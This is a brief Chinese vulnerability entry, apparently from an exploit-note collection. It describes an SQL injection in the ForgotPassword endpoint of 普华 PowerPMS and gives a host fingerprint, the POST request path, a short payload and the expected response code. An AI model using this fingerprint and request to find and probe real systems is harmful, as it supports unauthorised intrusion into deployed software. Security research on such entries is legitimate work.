# 普华PowerPMSForgotPassword存在SQL注入漏洞

普华 ｜ SQL注入 ｜ —
- **指纹**：`body="Power.login.init"`
- **请求**：`POST /Account/ForgotPassword HTTP/1.1`

**Payload**
```
email=%202
```
- **响应特征**：200